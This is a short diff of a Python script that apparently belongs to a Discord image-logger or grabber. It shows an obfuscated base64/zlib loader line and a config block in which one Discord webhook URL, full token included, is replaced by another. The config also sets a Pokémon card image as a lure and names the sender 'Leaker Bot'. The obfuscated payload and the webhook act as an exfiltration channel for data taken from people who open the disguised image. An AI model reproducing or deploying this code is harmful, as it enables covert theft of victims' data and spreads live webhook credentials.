@@ -3,7 +3,7 @@ _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1441456061528670258/u-NgRxR75hPMDOO2KMHkc0GbqxABr0jlYk1fdlgGDrjUC9QMYOrO-hr97ZGyAzI-ewJK",
+    "webhook": "https://discord.com/api/webhooks/1441464349418848268/9R0HwnplGfp62suz9AEE6R2ThnQkhX9xzDG1ZKiQPROU0AdeW735Vc9wxe_mGXnIsBLC",
     "image": "https://pkmncards.com/wp-content/uploads/charizard-ex-xy-promos-xy17-ptcgo-1.png",
     "imageArgument": True,
     "username": "Leaker Bot",
